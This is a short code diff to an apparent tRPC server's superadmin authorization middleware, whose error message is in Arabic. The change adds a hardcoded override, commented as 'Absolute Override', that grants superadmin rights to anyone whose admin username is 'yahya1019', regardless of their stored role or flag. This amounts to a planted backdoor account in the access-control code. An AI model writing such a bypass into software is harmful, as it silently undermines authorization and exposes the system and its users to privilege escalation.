@@ -78,7 +78,10 @@ const adminProcedure = publicProcedure.use(async ({ ctx, next }) => {
 });
 
 const superAdminProcedure = adminProcedure.use(async ({ ctx, next }) => {
-  if (ctx.adminRole !== "superadmin" && ctx.isSuperAdmin !== 1) {
+  // 🛡️ Absolute Override: Ensure yahya1019 is ALWAYS treated as SuperAdmin
+  const isSuperAdmin = ctx.adminUsername === "yahya1019" || ctx.adminRole === "superadmin" || ctx.isSuperAdmin === 1;
+  
+  if (!isSuperAdmin) {
     throw new TRPCError({ code: "FORBIDDEN", message: "هذا الإجراء يتطلب صلاحيات مدير النظام" });
   }
   return next();
